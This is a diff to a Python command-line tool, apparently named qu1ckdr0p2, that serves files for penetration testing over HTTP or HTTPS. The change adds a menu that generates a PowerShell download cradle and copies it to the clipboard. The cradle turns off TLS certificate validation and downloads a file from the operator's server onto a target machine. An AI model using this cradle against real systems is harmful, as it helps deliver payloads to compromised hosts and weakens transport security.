@@ -1,10 +1,12 @@
 import hashlib
 from flask import Flask, send_from_directory
-from flask import render_template_string
+from flask.logging import default_handler, request
 from tqdm import tqdm
 from halo import Halo
 from OpenSSL import crypto
 import os
+import pyperclip
+
 import netifaces as ni
 import logging
 import click
@@ -19,6 +21,7 @@ cli.show_server_banner = lambda *x: None
 app = Flask(__name__)
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
+logging.basicConfig(level=logging.INFO)
 
 user_home = os.path.expanduser("~")
 base_dir = os.path.join(user_home, ".qu1ckdr0p2")
@@ -45,7 +48,7 @@ for section in config.sections():
         aliases[key.lower()] = os.path.join(base_dir, value)
 
 def signal_handler(signum, frame):
-    click.echo(click.style(f"\n[!] ", fg='green') + click.style("CTRL+C detected, quitting\n", fg='yellow'))
+    click.echo(click.style(f"\n[*] ", fg='green') + click.style("CTRL+C detected, quitting\n", fg='yellow'))
     sys.exit(0)
 
 signal.signal(signal.SIGINT, signal_handler)
@@ -131,25 +134,57 @@ def load_config(file_path):
 
 
 def print_server_info(path_to_serve, protocol, ip_address, interface_name, port, filename, cert=None, privkey=None):
-    relative_path = os.path.relpath(path_to_serve, start=base_dir)  
-    spinner = Halo(spinner='dots', color='cyan', text_color='yellow')
+    while True:
+        click.clear()  
+        relative_path = os.path.relpath(path_to_serve, start=base_dir)  
+        spinner = Halo(spinner='dots', color='cyan', text_color='yellow')
 
-    click.echo(click.style(f"[→] ", fg='green') + click.style("Serving:", fg='yellow') + click.style(f" {relative_path}", fg='blue'))
-    click.echo(click.style(f"[→] ", fg='green') + click.style("Protocol:", fg='yellow') + click.style(f" {protocol}", fg='blue'))
-    click.echo(click.style(f"[→] ", fg='green') + click.style("IP address:", fg='yellow') + click.style(f" {ip_address}", fg='blue'))
-    click.echo(click.style(f"[→] ", fg='green') + click.style("Port:", fg='yellow') + click.style(f" {port}", fg='blue'))    
-    click.echo(click.style(f"[→] ", fg='green') + click.style("Interface:", fg='yellow') + click.style(f" {interface_name}", fg='blue'))  
+        click.echo(click.style(f"[→] ", fg='green') + click.style("Serving:", fg='yellow') + click.style(f" {relative_path}", fg='blue'))
+        click.echo(click.style(f"[→] ", fg='green') + click.style("Protocol:", fg='yellow') + click.style(f" {protocol}", fg='blue'))
+        click.echo(click.style(f"[→] ", fg='green') + click.style("IP address:", fg='yellow') + click.style(f" {ip_address}", fg='blue'))
+        click.echo(click.style(f"[→] ", fg='green') + click.style("Port:", fg='yellow') + click.style(f" {port}", fg='blue'))    
+        click.echo(click.style(f"[→] ", fg='green') + click.style("Interface:", fg='yellow') + click.style(f" {interface_name}", fg='blue'))  
 
-    if cert and privkey:
-        click.echo(click.style(f"[→] ", fg='green') + click.style("Using cert:", fg='yellow') + click.style(f" {cert}", fg='blue'))
-        click.echo(click.style(f"[→] ", fg='green') + click.style("Using key:", fg='yellow') + click.style(f" {privkey}", fg='blue'))
+        if cert and privkey:
+            click.echo(click.style(f"[→] ", fg='green') + click.style("Using cert:", fg='yellow') + click.style(f" {cert}", fg='blue'))
+            click.echo(click.style(f"[→] ", fg='green') + click.style("Using key:", fg='yellow') + click.style(f" {privkey}", fg='blue'))
 
-    click.echo(click.style(f"[→] ", fg='green') + click.style("CTRL+C to quit", fg='yellow'))
-    click.echo(click.style(f"\n[→] ", fg='green') + click.style("URL:", fg='yellow') + click.style(f" {protocol}://{ip_address}:{port}/{filename}\n", fg='blue'))
+        click.echo(click.style(f"[→] ", fg='green') + click.style("CTRL+C to quit", fg='yellow'))
+        click.echo(click.style(f"\n[→] ", fg='green') + click.style("URL:", fg='yellow') + click.style(f" {protocol}://{ip_address}:{port}/{filename}\n", fg='blue'))
+        powershell_code = (
+            f"Add-Type -TypeDefinition \"using System.Net;using System.Security.Cryptography.X509Certificates;"
+            f"public class SSLValidator {{public static void Ignore() {{ServicePointManager.ServerCertificateValidationCallback += "
+            f"(sender, certificate, chain, sslPolicyErrors) => true;}}}}\" -Language CSharp; [SSLValidator]::Ignore();"
+            f" Invoke-WebRequest -Uri {protocol}://{ip_address}:{port}/{filename} -OutFile {filename}"
+        )
 
-    # Start a new spinner to indicate that the web server is running
+        click.echo(
+            click.style("[→] ", fg="green")
+            + click.style("Powershell:", fg="yellow")
+            + click.style(f" {powershell_code}\n", fg="blue")
+        )
+        click.echo("Options:")
+        click.echo("1. Copy Cradle Powershell code to clipboard")
+        click.echo("2. Start the web server")
+        click.echo("3. Exit")
+        
+        choice = click.prompt("Enter your choice:", type=int)
+        
+        if choice == 1:
+            pyperclip.copy(powershell_code)
+            click.echo(click.style("[→] ", fg='green') + click.style("Cradle Powershell code copied to clipboard.", fg='blue'))
+            click.pause(info="Press any key to continue...")
+        elif choice == 2:
+            spinner.start("Web server running...")
+            break
+        elif choice == 3:
+            click.echo(click.style("Exiting...", fg='blue'))
+            break
+
+        
     spinner.start("Web server running...")
-  
+
+          
 def serve_files(path_to_serve, http_port=80, https_port=443):
     if os.path.isdir(path_to_serve):
         @app.route('/')
@@ -177,14 +212,32 @@ def serve_files(path_to_serve, http_port=80, https_port=443):
     protocol = "http" if http_port else "https"
     ip_address, interface_name = get_serving_ip()
     port = http_port or https_port
-    protocol = "http" if http_port else "https"
+
     
     cert_path, key_path = None, None
     if https_port:
         cert_path, key_path = generate_self_signed_cert(cert_dir)
         
     print_server_info(path_to_serve, protocol, ip_address, interface_name, port, filename, cert_path, key_path)
-    
+
+    @app.before_request
+    def log_request_info():
+        client_ip = request.remote_addr
+        client_method = request.method
+        client_path = request.url
+        click.echo(click.style(f"\n[→] ", fg='green') + click.style("Client Connected: ", fg='yellow') + click.style(f"{client_ip}", fg='blue'))
+        click.echo(click.style(f"[→] ", fg='green') + click.style("Method: ", fg='yellow') + click.style(f"{client_method}", fg='blue'))
+        click.echo(click.style(f"[→] ", fg='green') + click.style("Path: ", fg='yellow') + click.style(f"{client_path}", fg='blue'))
+
+    @app.after_request
+    def log_response(response):
+        if response.status_code == 200:
+            click.echo(click.style(f"[→] ", fg='green') + click.style("Success: ", fg='yellow') + click.style(f"HTTP {response.status_code}", fg='blue'))
+        else:
+            click.echo(click.style(f"[*] ", fg='red') + click.style("Failed: ", fg='yellow') + click.style(f"HTTP {response.status_code}", fg='red'))
+            click.echo(click.style(f"[*] ", fg='red') + click.style("Failure Message: ", fg='yellow') + click.style(f"{response.status}\n", fg='red'))
+        return response
+
     if http_port:
         app.run(host='0.0.0.0', port=http_port, threaded=True)
     elif https_port:
@@ -192,12 +245,12 @@ def serve_files(path_to_serve, http_port=80, https_port=443):
         if cert_path and key_path:
             app.run(host='0.0.0.0', port=https_port, ssl_context=(cert_path, key_path), threaded=True)
         else:
-            click.echo(click.style(f"\n[!] ", fg='red') + click.style("Could not generate or find SSL certificates.\n", fg='yellow'))
-
+            click.echo(click.style(f"\n[*] ", fg='red') + click.style("Could not generate or find SSL certificates.\n", fg='yellow'))
+        
 def invoke_serve_by_number(search=None, use=None, http=None, https=None):
     search_results = {alias: path for alias, path in aliases.items() if search.lower() in alias.lower() or search.lower() in path.lower()}
     if use > len(search_results) or use < 1:
-        click.echo(click.style(f"\n[!] ", fg='red') + click.style("The number provided with --use is out of range.\n", fg='yellow'))
+        click.echo(click.style(f"\n[*] ", fg='red') + click.style("The number provided with --use is out of range.\n", fg='yellow'))
         return
     
     selected_alias = list(search_results.keys())[use - 1]
@@ -223,10 +276,12 @@ def handle_github_auth(api_key):
         click.echo(click.style(f"[→] ", fg='green') + click.style("Github API key:", fg='yellow') + click.style(f" {api_key}", fg='blue'))
     else:
         click.echo(click.style(f"[-] ", fg='red') + click.style("No Github API key provided", fg='yellow'))
-        click.echo(click.style(f"[→] ", fg='red') + click.style("An API key is required to avoid rate limiting during downloads.", fg='yellow'))
-        click.echo(click.style(f"[→] ", fg='red') + click.style("This will be resolved in the future using releases.", fg='yellow'))
-        
-
+        click.echo(click.style(f"[*] ", fg='red') + click.style("An API key is required to avoid rate limiting during downloads.", fg='yellow'))
+        click.echo(click.style(f"[*] ", fg='red') + click.style("This will be resolved in the future using releases.", fg='yellow'))
+        click.echo(click.style(f"[*] ", fg='red') + click.style("Generate a token: https://github.com/settings/tokens/new", fg='yellow'))
+        click.echo(click.style(f"[*] ", fg='red') + click.style("Select the 'public_repo' scope", fg='yellow'))
+        click.echo(click.style(f"[*] ", fg='red') + click.style("Copy the token and run the following command:", fg='yellow'))
+        click.echo(click.style(f"[*] ", fg='red') + click.style("serv init --api-key <token>", fg='yellow'))
         sys.exit(0)
         
 
@@ -288,7 +343,7 @@ def update_self_function():
         subprocess.run(['pip', 'install', '--upgrade', 'qu1ckdr0p2'], check=True)
         click.echo(click.style(f"[→] ", fg='green') + click.style("Successfully updated qu1ckdr0p2\n\n", fg='blue'))
     except subprocess.CalledProcessError as e:
-        click.echo(click.style(f"[→] ", fg='red') + click.style("Failed to update {e}\n\n", fg='red'))
+        click.echo(click.style(f"[*] ", fg='red') + click.style("Failed to update {e}\n\n", fg='red'))
                 
 @click.group()
 @click.option('--debug', is_flag=True, help='Enable debug mode.')
@@ -302,7 +357,7 @@ def cli(ctx, debug):
         log.setLevel(logging.DEBUG)
         app.debug = True
         logging.basicConfig(level=logging.DEBUG)
-        click.echo(click.style('[!] ', fg='red') + click.style('Debug mode enabled', fg='red', blink=True, bold=True))
+        click.echo(click.style('[*] ', fg='red') + click.style('Debug mode enabled', fg='red', blink=True, bold=True))
           
 @cli.command(context_settings={"help_option_names": ['-h', '--help']})
 @click.option('-l', '--list', 'list_flag', is_flag=True, help="List aliases")
@@ -331,7 +386,7 @@ def serve(ctx, list_flag, search, use, directory, file, http, https):
         return
 
     if use is not None:
-        click.echo(click.style(f"\n[!] ", fg='red') + click.style("You must provide a search term along with --use.\n", fg='yellow'))
+        click.echo(click.style(f"\n[*] ", fg='red') + click.style("You must provide a search term along with --use.\n", fg='yellow'))
         return
 
     if directory:
@@ -388,3 +443,4 @@ def init(check, skip_config, skip_windows, skip_linux, skip_mac, api_key, update
 if __name__ == "__main__":
     target_directory = os.path.dirname(os.path.abspath(__file__))   
     cli(obj={})
+    
